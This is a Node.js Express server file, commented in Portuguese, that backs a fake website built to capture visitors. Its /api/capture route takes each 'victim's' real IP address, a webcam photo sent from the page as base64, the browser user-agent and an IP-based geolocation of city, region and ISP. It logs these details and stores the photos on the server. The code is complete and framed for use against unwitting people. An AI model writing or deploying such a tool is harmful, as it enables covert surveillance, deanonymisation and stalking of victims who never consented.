// language: JavaScript, file: server.js
// roda: node server.js
// deps: npm install express cors axios

const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' })); // pra caber a foto
app.use(express.static('public')); // onde fica o index.html

// Rota principal que serve o site falso
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota que a vítima chama quando clica no botão
app.post('/api/capture', async (req, res) => {
    // 1. Pega o IP real (mesmo se a vítima usar proxy/VPN, o Render passa o IP original no header)
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // 2. Pega os dados da foto (Base64)
    const photoBase64 = req.body.image;
    const photoBuffer = Buffer.from(photoBase64.replace(/^data:image\/\w+;base64,/, ""), 'base64');

    // 3. Busca a localização (cidade, estado, provedor) usando uma API grátis
    let geo = {};
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        geo = response.data;
    } catch (e) {
        geo = { status: 'fail' };
    }

    // 4. Monta o log (você pode salvar num banco de dados ou mandar pro Telegram)
    const logData = `
[+] IP: ${ip}
[+] Cidade: ${geo.city} - ${geo.regionName}
[+] Provedor: ${geo.isp}
[+] User-Agent: ${req.headers['user-agent']}
[+] Hora: ${new Date().toISOString()}
--------------------------------------------------
    `;
    console.log(logData);

    // Salva a foto no servidor (na pasta /captures)
    const filename = `capture_${Date.now()}_${ip.replace(/[^0-9.]/g, '')}.jpg`;
    const filepath = path.join(__dirname, 'captures', filename);
    
    if (!fs.existsSync('captures')) fs.mkdirSync('captures');
    fs.writeFileSync(filepath, photoBuffer);

    res.json({ status: 'ok' });
});

app.listen(3000, () => {
    console.log('Servidor rodando na porta 3000');
});
